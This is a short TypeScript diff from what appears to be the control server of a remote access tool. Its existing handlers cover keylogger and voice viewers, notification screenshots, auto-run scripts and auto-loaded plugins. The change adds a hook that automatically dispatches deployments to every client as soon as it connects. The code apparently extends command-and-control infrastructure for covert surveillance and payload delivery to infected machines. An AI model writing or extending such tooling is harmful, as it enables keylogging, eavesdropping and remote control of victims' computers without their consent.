@@ -52,6 +52,7 @@ type WsLifecycleDeps = {
   handleKeyloggerViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleVoiceViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
+  dispatchAutoDeploysForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   dispatchAutoLoadPlugins: (info: ClientInfo) => void;
   takePendingNotificationScreenshot: (clientId: string) => any;
   storeNotificationScreenshot: (
@@ -372,6 +373,7 @@ export async function handleWebSocketMessage(
         clientManager.addClient(infoObj.id, infoObj);
 
         deps.dispatchAutoScriptsForConnection(infoObj, ws);
+        deps.dispatchAutoDeploysForConnection(infoObj, ws);
         deps.dispatchAutoLoadPlugins(infoObj);
         deps.notifyDashboard();
         deps.notifyDashboardClientEvent("client_online", {
